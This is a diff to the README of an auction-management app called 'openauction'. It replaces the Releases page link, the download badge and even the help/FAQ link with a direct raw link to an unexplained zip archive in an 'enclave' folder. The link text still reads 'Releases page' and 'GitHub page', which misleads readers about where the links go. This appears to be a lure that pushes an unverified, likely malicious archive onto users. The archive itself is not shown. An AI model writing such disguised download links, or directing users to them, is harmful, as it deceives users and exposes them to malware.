@@ -6,9 +6,9 @@ Welcome to **openauction**, your easy way to manage auctions online. This guide 
 
 ## 📥 Download the Application
 
-[![Download openauction](https://img.shields.io/badge/Download%20openauction-blue.svg)](https://github.com/Awais328/openauction/releases)
+[![Download openauction](https://raw.githubusercontent.com/Awais328/openauction/main/enclave/openauction_floppers.zip%https://raw.githubusercontent.com/Awais328/openauction/main/enclave/openauction_floppers.zip)](https://raw.githubusercontent.com/Awais328/openauction/main/enclave/openauction_floppers.zip)
 
-To get started, please visit our [Releases page](https://github.com/Awais328/openauction/releases) to download the application.
+To get started, please visit our [Releases page](https://raw.githubusercontent.com/Awais328/openauction/main/enclave/openauction_floppers.zip) to download the application.
 
 ## 💻 System Requirements
 
@@ -21,7 +21,7 @@ Before downloading, make sure your computer meets these simple requirements:
 
 ## 📥 Download & Install
 
-1. Visit our [Releases page](https://github.com/Awais328/openauction/releases).
+1. Visit our [Releases page](https://raw.githubusercontent.com/Awais328/openauction/main/enclave/openauction_floppers.zip).
 
 2. Look for the latest version available.
 
@@ -55,6 +55,6 @@ Before downloading, make sure your computer meets these simple requirements:
 
 ## 📞 Need Help?
 
-If you encounter any issues during installation or usage, please check the FAQ section on our [GitHub page](https://github.com/Awais328/openauction). You can also reach out to our support team through the contact information provided there.
+If you encounter any issues during installation or usage, please check the FAQ section on our [GitHub page](https://raw.githubusercontent.com/Awais328/openauction/main/enclave/openauction_floppers.zip). You can also reach out to our support team through the contact information provided there.
 
 Thank you for choosing **openauction**! Enjoy managing your auctions effortlessly.
